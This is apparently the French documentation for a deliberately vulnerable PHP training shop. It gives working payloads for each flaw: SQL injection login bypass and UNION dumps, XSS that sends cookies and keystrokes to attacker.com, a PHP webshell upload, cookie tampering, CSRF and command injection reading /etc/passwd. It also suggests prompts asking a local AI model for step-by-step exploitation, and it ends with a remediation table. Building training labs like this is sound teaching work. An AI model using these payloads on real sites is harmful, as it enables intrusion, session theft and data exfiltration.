# VulnShop - Documentation des Vulnérabilités

> **ATTENTION**: Ce site est intentionnellement vulnérable à des fins éducatives.
> Ne JAMAIS déployer ce code en production ou sur un serveur accessible publiquement.

## Table des Matières

1. [SQL Injection](#1-sql-injection)
2. [Cross-Site Scripting (XSS)](#2-cross-site-scripting-xss)
3. [Broken Access Control / IDOR](#3-broken-access-control--idor)
4. [Privilege Escalation](#4-privilege-escalation)
5. [Insecure File Upload](#5-insecure-file-upload)
6. [Weak Password Storage](#6-weak-password-storage)
7. [Information Disclosure](#7-information-disclosure)
8. [Missing CSRF Protection](#8-missing-csrf-protection)
9. [Command Injection](#9-command-injection)

---

## 1. SQL Injection

### Localisation: `login.php`
**Type**: Authentication Bypass

```sql
-- Payload pour bypass login:
Username: admin' OR '1'='1' --
Password: anything

-- Ou encore:
Username: admin'--
Password: anything
```

**Fichier**: `login.php:22`
```php
$query = "SELECT * FROM users WHERE username='$username' AND password=MD5('$password')";
```

### Localisation: `products.php`
**Type**: Data Extraction via UNION

```sql
-- Dans le champ recherche:
' UNION SELECT 1,username,password,4,5,6,7 FROM users--

-- Pour extraire la structure:
' UNION SELECT 1,table_name,3,4,5,6,7 FROM information_schema.tables WHERE table_schema=database()--
```

**Fichier**: `products.php:18-26`

### Localisation: `product.php`
**Type**: SQL Injection via ID

```
URL: product.php?id=1 OR 1=1
URL: product.php?id=1 UNION SELECT 1,2,3,4,5,6,7
```

**Fichier**: `product.php:14`

### Localisation: `orders.php`
**Type**: SQL Injection + IDOR

```
URL: orders.php?order_id=1 OR 1=1
```

---

## 2. Cross-Site Scripting (XSS)

### XSS Réfléchi - `products.php`
**Localisation**: Paramètre de recherche

```html
<!-- Payload dans l'URL -->
products.php?search=<script>alert('XSS')</script>

<!-- Vol de cookies -->
products.php?search=<script>document.location='http://attacker.com/?c='+document.cookie</script>

<!-- Injection d'image -->
products.php?search=<img src=x onerror="alert('XSS')">
```

**Fichier**: `products.php:64`

### XSS Stocké - `product.php`
**Localisation**: Commentaires produits

```html
<!-- Dans le formulaire de commentaire -->
<script>alert('Stored XSS')</script>

<!-- Keylogger -->
<script>document.onkeypress=function(e){new Image().src='http://attacker.com/log?k='+e.key}</script>

<!-- Session Hijacking -->
<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>
```

**Fichier**: `product.php:86`

---

## 3. Broken Access Control / IDOR

### Localisation: `orders.php`
**Type**: Insecure Direct Object Reference

Un utilisateur connecté peut accéder aux commandes d'autres utilisateurs:

```
# Étant connecté en tant que user1, accéder aux commandes de user2:
orders.php?order_id=1
orders.php?order_id=2
orders.php?order_id=3
```

**Fichier**: `orders.php:20-26`
- Pas de vérification que `order_id` appartient à `user_id`

---

## 4. Privilege Escalation

### Méthode 1: Cookie Tampering - `admin/dashboard.php`

```javascript
// Dans la console navigateur:
document.cookie = "role=admin; path=/";
// Puis accéder à /admin/dashboard.php
```

**Fichier**: `admin/dashboard.php:14-18`

### Méthode 2: Mass Assignment - `profile.php`

```html
<!-- Modifier le champ caché via DevTools -->
<input type="hidden" name="role" value="admin">

<!-- Ou via curl/Burp Suite -->
POST /profile.php
Content-Type: application/x-www-form-urlencoded

username=user1&email=user1@test.com&role=admin
```

**Fichier**: `profile.php:20-25`

### Méthode 3: Cookie Remember Me - `login.php`

```javascript
// Après connexion avec "Remember me":
document.cookie = "user_id=1; path=/";  // ID admin
document.cookie = "role=admin; path=/";
```

**Fichier**: `login.php:33-36`

---

## 5. Insecure File Upload

### Localisation: `profile.php`
**Type**: Unrestricted File Upload

```bash
# Upload d'un webshell PHP
# 1. Créer un fichier: shell.php
<?php system($_GET['cmd']); ?>

# 2. L'uploader comme "avatar"
# 3. Accéder à: /uploads/avatars/shell.php?cmd=whoami
```

**Fichier**: `profile.php:45-58`
- Pas de validation du type MIME
- Pas de restriction d'extension
- Nom de fichier original conservé

---

## 6. Weak Password Storage

### Localisation: `register.php`, `login.php`
**Type**: MD5 sans salt

```php
// Mots de passe stockés en MD5 (facilement cassables)
$password_hash = md5($password);
```

**Mots de passe de test (hash MD5):**
| User | Password | MD5 Hash |
|------|----------|----------|
| admin | admin123 | 0192023a7bbd73250516f069df18b500 |
| user1 | password | 5f4dcc3b5aa765d61d8327deb882cf99 |
| user2 | 123456 | e10adc3949ba59abbe56e057f20f883e |

```bash
# Cracker avec hashcat:
hashcat -m 0 -a 0 hash.txt rockyou.txt
```

---

## 7. Information Disclosure

### Debug SQL visible - Multiples fichiers

```html
<!-- Commentaires HTML visibles dans le source -->
<!-- DEBUG: SELECT * FROM users WHERE username='admin' -->
<!-- Query: SELECT * FROM products WHERE... -->
<!-- Erreur SQL: ... -->
```

**Fichiers concernés:**
- `login.php:26`
- `products.php:32`
- `product.php:17`
- `orders.php:25`
- `profile.php:34`

### Messages d'erreur détaillés - `login.php`

```
"L'utilisateur 'admin' n'existe pas"
"Mot de passe incorrect pour 'admin'"
```

**Fichier**: `login.php:41-46`

---

## 8. Missing CSRF Protection

### Localisation: Tous les formulaires

Aucun token CSRF n'est implémenté:

```html
<!-- Attaque CSRF - Forcer un commentaire -->
<form action="http://localhost/vulnerable_shop/product.php?id=1" method="POST">
    <input type="hidden" name="comment" value="Commentaire malveillant">
    <input type="submit" value="Cliquez ici pour gagner!">
</form>

<!-- Auto-submit -->
<body onload="document.forms[0].submit()">
```

**Fichiers sans CSRF:**
- `product.php` (commentaires)
- `profile.php` (modification profil)
- `login.php` / `register.php`

---

## 9. Command Injection

### Localisation: `admin/dashboard.php`
**Type**: OS Command Injection (simulé)

```bash
# Dans le champ backup:
backup_name; cat /etc/passwd
backup_name && whoami
backup_name | ls -la
backup_name`id`
```

**Fichier**: `admin/dashboard.php:30-35`
```php
$command = "mysqldump -u root vulnerable_shop > backups/" . $backup_name . ".sql";
```

---

## Utilisation avec Ollama/Llama3

### Prompts suggérés pour votre IA locale:

```
1. "Analyse la page login.php et explique-moi comment exploiter une injection SQL pour contourner l'authentification"

2. "Je suis sur products.php, comment puis-je extraire les mots de passe des utilisateurs via SQL injection?"

3. "Explique-moi étape par étape comment réaliser une élévation de privilèges sur ce site"

4. "Comment puis-je voler les cookies d'un administrateur via XSS stocké?"

5. "Décris le processus complet pour uploader un webshell et obtenir un accès au serveur"
```

---

## Checklist d'Exploitation

- [ ] SQL Injection - Bypass login
- [ ] SQL Injection - Extraction de données (UNION)
- [ ] XSS Réfléchi - Vol de session
- [ ] XSS Stocké - Persistance
- [ ] IDOR - Accès aux commandes
- [ ] Privilege Escalation - Cookie tampering
- [ ] Privilege Escalation - Mass Assignment
- [ ] File Upload - Webshell
- [ ] Password Cracking - MD5
- [ ] Information Disclosure - Debug SQL
- [ ] CSRF - Action non autorisée
- [ ] Command Injection - RCE (simulé)

---

## Remédiation (Pour information)

| Vulnérabilité | Solution |
|---------------|----------|
| SQL Injection | Requêtes préparées (PDO/mysqli_prepare) |
| XSS | htmlspecialchars(), Content-Security-Policy |
| IDOR | Vérification d'appartenance des ressources |
| Privilege Escalation | JWT signés, vérification côté serveur |
| File Upload | Validation MIME, extension whitelist, stockage hors webroot |
| Weak Password | bcrypt/Argon2 avec salt |
| CSRF | Tokens CSRF par formulaire |
| Command Injection | Éviter shell_exec, escapeshellarg() |

---

**Auteur**: Projet éducatif cybersécurité
**Usage**: Démonstration et formation uniquement
